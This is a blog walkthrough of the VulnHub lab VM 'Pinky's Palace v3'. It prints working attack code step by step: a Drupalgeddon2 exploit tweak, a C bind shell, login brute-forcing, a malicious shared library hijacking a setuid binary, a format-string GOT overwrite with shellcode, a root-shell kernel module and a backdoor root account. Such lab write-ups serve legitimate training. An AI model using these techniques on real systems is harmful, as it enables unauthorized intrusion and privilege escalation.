---
layout: post
date: 2018-08-23 12:12:13 +0000
last_modified_at: 2018-08-24 07:15:54 +0000
title: "Pinky's Palace: v3 Walkthrough"
subtitle: "Shells, Shells Everywhere"
category: Walkthrough
tags: [VulnHub, "Pinky's Palace"]
comments: true
image:
  feature: pinkys-palace-v3-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/pink-panther-bank-rest-sit-figure-1636508/
---

This post documents the complete walkthrough of Pinky's Palace: v3 a boot2root [VM][1] created by [Pink_Panther][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

I really wished there's a backstory to the VM—it'll make it a little more interesting. Having said that, the previous two VMs were challenging, fun, and provided plenty of learning opportunities—no backstory no big deal.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             173 May 14 17:37 WELCOME
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.30.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5555/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 80:52:6e:bd:b0:c4:be:0a:f2:1d:3b:ac:b8:47:4f:ee (RSA)
|   256 eb:c8:76:a4:cf:37:6f:0d:5f:f5:48:af:5c:29:92:d9 (ECDSA)
|_  256 48:2b:84:02:3e:87:7b:2a:f3:91:11:31:0f:98:11:c7 (ED25519)
8000/tcp open  http    syn-ack ttl 64 nginx 1.10.3
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Supported Methods: GET HEAD POST
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: nginx/1.10.3
|_http-title: PinkDrup
```

SSH is at `5555/tcp` while Drupal 7 is running behind `8000/tcp`. In any case, let's check out the FTP since I can login anonymously.

### Passive FTP

First up, I notice active FTP is not working.

![641bb11b.png](/assets/images/posts/pinkys-palace-v3-walkthrough/641bb11b.png)

Let's try again, this time using passive FTP.

![591a6314.png](/assets/images/posts/pinkys-palace-v3-walkthrough/591a6314.png)

Notice something interesting? There's a directory with three dots.

Well, let's get the `WELCOME` message and see what it has to say.

![3467c2bf.png](/assets/images/posts/pinkys-palace-v3-walkthrough/3467c2bf.png)

Fair enough. Now, let's dig deeper.

![8787ee06.png](/assets/images/posts/pinkys-palace-v3-walkthrough/8787ee06.png)

No wonder active FTP is not working—the VM is unable to start outbound connections—the firewall blocks it.

### Drupal 7

Next, let's focus our attention on Drupal 7. I'm sure you are aware that Drupal versions before 7.58, 8.3.9, 8.4.6 and 8.5.1 is susceptible to a remote code execution attack known as 'Drupalgeddon2'.

![cfd11c93.png](/assets/images/posts/pinkys-palace-v3-walkthrough/cfd11c93.png)

I know the right exploit for this. Check out EDB-ID [44449](https://www.exploit-db.com/exploits/44449/). If everything goes well, I should have a low-privilege shell. Let's do this.

My first attempt didn't go well. The script needed a slight modification.

<div class="filename"><span>drupalggedon.rb</span></div>

```rb
...
# Add this function
def http_get(url, payload="")
  uri = URI(url)
  request = Net::HTTP::Get.new(uri.request_uri)
  request.initialize_http_header({"User-Agent" => $useragent})
  request.body = payload
  return $http.request(request)
end
...
# Change to http_get for the checks
url.each do|uri|
  # Check response
  response = http_get(uri)
```

Let's run it.

![f5a3d456.png](/assets/images/posts/pinkys-palace-v3-walkthrough/f5a3d456.png)

I get a low-privilege shell.

### Low-Privilege Shell Redux

I don't know about you but I like me a proper shell. Remember the firewall blocks outbound connections? Because of that, I'll have to upload a bind shell instead.

With that in mind, let's write a 32-bit bind shell in C (`pinky-palace` is running 32-bit Debian 9.4). The bind shell takes a port number as its argument in case I need to reuse it on different ports.

<div class="filename"><span>bindshell.c</span></div>

```c
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[]) {

  int host_sock = socket(AF_INET, SOCK_STREAM, 0);

  struct sockaddr_in host_addr;
  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(atoi(argv[1]));
  host_addr.sin_addr.s_addr = INADDR_ANY;

  bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
  listen(host_sock, 0);

  int client_sock = accept(host_sock, NULL, NULL);
  dup2(client_sock, 0);
  dup2(client_sock, 1);
  dup2(client_sock, 2);

  execve("/bin/bash", NULL, NULL);
}
```

Compile `bindshell.c` for the 32-bit platform. If you are running a 32-bit GNU/Linux distribution, then you can drop the `-m32`.

```
# gcc -m32 -o bindshell bindshell.c
```

Compress it with `gzip` and convert it to the hexadecimal representation with `xxd`.

```
# gzip -c < bindshell > bindshell.gz
# xxd -p bindshell.gz | tr -d '\n' && echo
```

Reverse the process over at the fake shell.

```
> echo 1f8b...0000 > /tmp/bindshell.gz.hex
> xxd -p -r < /tmp/bindshell.gz.hex > /tmp/bindshell.gz
> gunzip -c < /tmp/bindshell.gz > /tmp/bindshell
> chmod 755 /tmp/bindshell
> /tmp/bindshell 4444
```

Connect to the bind shell with `nc` and spawn a pseudo-TTY.

![8bb72670.png](/assets/images/posts/pinkys-palace-v3-walkthrough/8bb72670.png)

Now that I've a proper shell, let's find out what else the VM has to offer. I soon discover that `pinksec` is running two instances of Apache at `80/tcp` and `65334/tcp` on the loopback interface, i.e. 127.0.0.1.

Here's how to determine:
+ check `ps auwx` and notice that `pinksec` is running Apache
+ check `netstat -lunt` and notice that the loopback interface is listening on `80/tcp` and `65334/tcp`.
+ ascertain the above observations with Apache configuration

![826d94fa.png](/assets/images/posts/pinkys-palace-v3-walkthrough/826d94fa.png)
![dab4da3c.png](/assets/images/posts/pinkys-palace-v3-walkthrough/dab4da3c.png)

Notice that the server admin is `pinkyadmin` and the two `VirtualHost`s have different `DocumentRoot`s?

Lucky for us, `socat` is available on the VM; I can use it to perform port-forwarding, and since non-`root` users are able to open high ports (above 1024), let's do something like this.

```
$ socat tcp-listen:4480,fork tcp:127.0.0.1:80 &
$ socat tcp-listen:4488,fork tcp:127.0.0.1:65334 &
```

Sweet. I can access both instances.

![72bf7ccc.png](/assets/images/posts/pinkys-palace-v3-walkthrough/72bf7ccc.png)

![a83ee1f6.png](/assets/images/posts/pinkys-palace-v3-walkthrough/a83ee1f6.png)

### Let the Fuzzing Begin

It's time for a round of fuzzing to determine the directories and files for further exploration. As usual, my weapon of choice is `wfuzz` combined with quality wordlists.

For `/home/pinksec/html`, I'm going with SecLists' `quickhits.txt`. Here's what `wfuzz` found.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --sc 200 -t 50 http://192.168.30.129:4480/FUZZ
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.129:4480/FUZZ
Total requests: 2371

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000918:  C=200      0 L	       0 W	      0 Ch	  "/config.php"
001505:  C=200      0 L	       6 W	     45 Ch	  "/login.php"
001959:  C=200    221 L	     507 W	  12991 Ch	  "/server-status/"

Total time: 3.857244
Processed Requests: 2371
Filtered Requests: 2368
Requests/sec.: 614.6874
```

For `/home/pinksec/database`, since it has something to do with database, I'm going with `sqlmap`'s wordlist, `common-tables.txt` for common tables names; and SecList's `web-mutation.txt` for uncommon extensions. Here's what `wfuzz` found.

```
# wfuzz -w common.txt -w /usr/share/seclists/Discovery/Web-Content/web-mutations.txt --sc 200 -t 50 http://192.168.30.129:4488/FUZZFUZ2Z
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.129:4488/FUZZFUZ2Z
Total requests: 146916

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

082167:  C=200     18 L	      18 W	    221 Ch	  "pwds - .db"

Total time: 268.0692
Processed Requests: 146916
Filtered Requests: 146915
Requests/sec.: 548.0524
```

Let's check out `pwds.db`.

![c663b1d5.png](/assets/images/posts/pinkys-palace-v3-walkthrough/c663b1d5.png)

Looks like a password list. More fuzzing??!!

Let's take stock of what we know so far:

+ username: `pinkyadmin`
+ password: `pwd.dbs` (18 candidates)
+ PIN: 5-digit (10<sup>5</sup> or 100,000 candidates)

You can generate a list of 5-digit PINs with a command like so.

```
# seq 00000 999999 > pins.txt
```

All in all, we have 1,800,000 possible combinations, which is still manageable. Let's give it a shot with `wfuzz` again.

FML. `wfuzz` took almost an hour to exhaust all the combinations—no result whatsoever—then it dawned upon me—`pinkyadmin` wasn't the username. :angry:

I have to think of an alternative fast. Recall the only user on Drupal 7 was `pinkadmin`. Perhaps this is the correct username?

![8da59ace.png](/assets/images/posts/pinkys-palace-v3-walkthrough/8da59ace.png)

Let's try again, using `pinkadmin` as the username. Let's hope I have better luck this time.

```
# wfuzz -w pwds.db -w pins.txt -d "user=pinkadmin&pass=FUZZ&pin=FUZ2Z" -t 50 --hw 6 http://192.168.30.129:4480/login.php
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.30.129:4480/login.php
Total requests: 1800000

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

1355850:  C=302      0 L	       0 W	      0 Ch	  "AaPinkSecaAdmin4467 - 55849"

Total time: 3549.939
Processed Requests: 1800000
Filtered Requests: 1799999
Requests/sec.: 507.0508
```

Boom. I got it this time.

### PinkSec Control Panel

The credential is correct (`pinkadmin:AaPinkSecaAdmin4467:55849`). After logging in, I got redirected to this.

![69c8baee.png](/assets/images/posts/pinkys-palace-v3-walkthrough/69c8baee.png)

Sweet. I can execute commands through this web shell.

![b74e7a9e.png](/assets/images/posts/pinkys-palace-v3-walkthrough/b74e7a9e.png)

Time to get shell for `pinksec`. Let's generate a SSH keypair on my local machine and transfer the public key to `/home/pinksec/.ssh/authorized_keys` like so.

![4f3f9c7d.png](/assets/images/posts/pinkys-palace-v3-walkthrough/4f3f9c7d.png)

Execute the following command in the web shell.

```
mkdir /home/pinksec/.ssh; echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbTLpnI4gWcXU6GiD3VjMSSv6n5tEkeHvucJNpYnlRzaKnrmS9R+HEgNi5T7uNbTpI1W9YNrXWKrxpKiGkiMkZCzZw1bU0IDXUX5CgMF3TxZyrbgMZTETd3bu9T68XHU0XD8XmK+qFN8JiWRpzH3bNksPoZliRI1mhM5ucF2BguCe8d6Gki7D/KBJx4j125jrckJ8BEttmVSujyJx+MA/13yPpDz4M9Rx2OH68xmeWET5ZgmDeGFQLqDFYiB+let9t3jZEetEdd+VpdbSK8wrac6X1QcDH436Fp3hiDNOgjHF4P0LDK1GUuxrGxBDHz6InIueI5KNsvxlDlWDZFKU3 > /home/pinksec/.ssh/authorized_keys
```

Let's SSH into `pinksec`'s account.

![f81a29d7.png](/assets/images/posts/pinkys-palace-v3-walkthrough/f81a29d7.png)

During enumeration of `pinksec`'s account, I found the following:

+ `/home/pinksec/pinksecd` is `setuid` to `pinksecmanagement`
+ `/home/pinksec/pinksecd` loads a library at `/lib/libpinksec.so`
+ `/lib/libpinksec.so` is world-writable

Armed with this knowledge, I can compile a bogus `/lib/libpinksec.so` to gain `pinksecmanagement` privilege like this.

First, the bogus code.

<div class="filename"><span>libpinksec.c</span></div>

```c
#include <unistd.h>

void _init() {
  execve("/bin/sh", NULL, NULL);
}
```

![ed872e4a.png](/assets/images/posts/pinkys-palace-v3-walkthrough/ed872e4a.png)

Compile the code as a shared library and save it to `/lib/libpinksec.so`.

```
$ gcc -fPIC -shared -nostartfiles -o /lib/libpinksec.so /tmp/libpinksec.c
```

Let's execute `/home/pinksec/bin/pinksecd`.

![2bb999bd.png](/assets/images/posts/pinkys-palace-v3-walkthrough/2bb999bd.png)

My effective UID is that of `pinksecmanagement`. Let's repeat the same SSH trick, this time for `pinksecmanagement`.

![08fa4456.png](/assets/images/posts/pinkys-palace-v3-walkthrough/08fa4456.png)

Copy the public key over to `/home/pinksecmanagement/.ssh/authorized_keys` like this.

![3cc4c719.png](/assets/images/posts/pinkys-palace-v3-walkthrough/3cc4c719.png)

Now, let's SSH into `pinksecmanagement`'s account.

![d1e66503.png](/assets/images/posts/pinkys-palace-v3-walkthrough/d1e66503.png)

During the enumeration of `pinksecmanagement`'s account, I found the following:

+ `/usr/local/bin/PSMCCLI` is `setuid` to `pinky`
+ `pinkysecmanagement` group is able to read, write and execute `/usr/local/bin/PSMCCLI`

### Format String Vulnerability

Using `pinksecmanagement`'s account, I was able to download a copy of `/usr/local/bin/PSMCCLI` for further analysis. I soon discover `/usr/local/bin/PSMCCLI` accepts one argument and uses `printf` to print the argument without using a format string in the `argshow` function.

![63edd74f.png](/assets/images/posts/pinkys-palace-v3-walkthrough/63edd74f.png)

The format string vulnerability occurs at the two instructions shown above.

Let's examine how we can exploit this vulnerability.

![a30c31af.png](/assets/images/posts/pinkys-palace-v3-walkthrough/a30c31af.png)

You can see that "AAAA" appears at the 137th parameter and "BBBB" after that at the 138th parameter. Armed with this knowledge, we can use direct parameter access instead to access them.

![a8b9ab8c.png](/assets/images/posts/pinkys-palace-v3-walkthrough/a8b9ab8c.png)

Now, if we change the parameter from `%x` to `%n`, we can write to the memory address specified by "AAAA" and "BBBB", the number of bytes that were output up to the first and second `%n`.

OK. Where do we write and what to write?

If you look at the disassembly of `argshow` above, right after the vulnerability, the program calls `putchar`. We could override the GLT of `putchar` to an address in the stack that contains shellcode. Of course, now we need to determine if the stack is executable.

_Use `readelf` to look at `/usr/local/bin/PSMCCLI`._

![054a344f.png](/assets/images/posts/pinkys-palace-v3-walkthrough/054a344f.png)

Good. The stack is executable.

Next, we need to determine the GLT address of `putchar` to overwrite.

_Use `objdump` to look at `/usr/local/bin/PSMCCLI`._

![7b064e6b.png](/assets/images/posts/pinkys-palace-v3-walkthrough/7b064e6b.png)

When the program calls `putchar`, it `JMP`s to the address contained in `0x804a01c`. What address do we put in `0x804a01c`?

It's possible to put shellcode in an environment variable. The beauty of doing so—you can locate the address of the environment variable with code like this, since it's located in the `/usr/local/bin/PSMCCLI`'s stack.

<div class="filename"><span>getenvaddr.c</span></div>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char *ptr;

    if(argc < 3) {
        printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]); /* get env var location */
    ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
    printf("%s will be at %p\n", argv[1], ptr);
}
```

![82a14525.png](/assets/images/posts/pinkys-palace-v3-walkthrough/82a14525.png)

I've chosen a small-sized [shellcode](http://shell-storm.org/shellcode/files/shellcode-827.php) that runs `/bin/sh`. Let's export the shellcode into an environment variable, say `SPLOIT`, and run `getenvaddr` against it like so.

![bae6afdd.png](/assets/images/posts/pinkys-palace-v3-walkthrough/bae6afdd.png)

We now have all the ingredients to bake our exploit.

+ Memory address to overwrite: `0x804a01c`
+ The address to write: `0xbffffedd`

The exploit looks like this.

```
$ /usr/local/bin/PSMCCLI $(printf "\x1c\xa0\x04\x08\x1e\xa0\x04\x08")CC%65235x%137\$hn%49442x%138\$hn
```

We use short writes signified by a `h` before the `n` format parameter, to write a pair of two bytes (`0xfedd` and `0xbfff` considering little-endian architecture) directly to two memory address using direct parameter access.

Let's run the exploit.

![6fbda820.png](/assets/images/posts/pinkys-palace-v3-walkthrough/6fbda820.png)

Now, we can repeat the same SSH trick shown above to get a proper shell.

![a9d9e5a1.png](/assets/images/posts/pinkys-palace-v3-walkthrough/a9d9e5a1.png)

I've full access to `pinky`, `pinksec`, and `pinksecmanagement`. Now, it's time to be `root`.

### Privilege Escalation

During enumeration of `pinky`'s account, this is what I found.

![53ae09b5.png](/assets/images/posts/pinkys-palace-v3-walkthrough/53ae09b5.png)

Whoa! Looks like I need to write my own kernel module. I chanced upon this [tutorial](https://www.ibm.com/developerworks/library/l-user-space-apps/index.html) on invoking user-space applications from the kernel while searching for "kernel module usermode api" in Google.

To that end, I wrote a kernel module that invokes my old bind shell `/tmp/bindshell` to listen at `9999/tcp`.

<div class="filename"><span>root.c</span></div>

```c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void)
{
  char *argv[] = { "/tmp/bindshell", "9999", NULL };
  static char *envp[] = {
    "HOME=/tmp/",
    "TERM=xterm",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

  return 0;
}

void cleanup_module(void)
{
  printk(KERN_INFO "Goodbye!");
}`
```

I'll also need to create a `Makefile` following the `kbuild` process like so.

<div class="filename"><span>Makefile</span></div>

```
obj-m += root.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

![d5158a1d.png](/assets/images/posts/pinkys-palace-v3-walkthrough/d5158a1d.png)

Now, let's load the module.

![a9cae166.png](/assets/images/posts/pinkys-palace-v3-walkthrough/a9cae166.png)

Connect to the shell at `9999/tcp`.

![38861aa5.png](/assets/images/posts/pinkys-palace-v3-walkthrough/38861aa5.png)

Woohoo! I'm `root`.

Let's do something different. Instead of using the SSH trick, let's create a phony user account with `root`'s privileges.

![5b8f6081.png](/assets/images/posts/pinkys-palace-v3-walkthrough/5b8f6081.png)

Open another `terminal` and SSH to the VM with this credential (`toor:toor`).

![1f409c38.png](/assets/images/posts/pinkys-palace-v3-walkthrough/1f409c38.png)

### Eyes on the Prize

Boohoo. It's over.

![f5e4f71d.png](/assets/images/posts/pinkys-palace-v3-walkthrough/f5e4f71d.png)

:dancer:

[1]: https://www.vulnhub.com/entry/pinkys-palace-v3,237/
[2]: https://twitter.com/@Pink_P4nther
[3]: https://www.vulnhub.com/
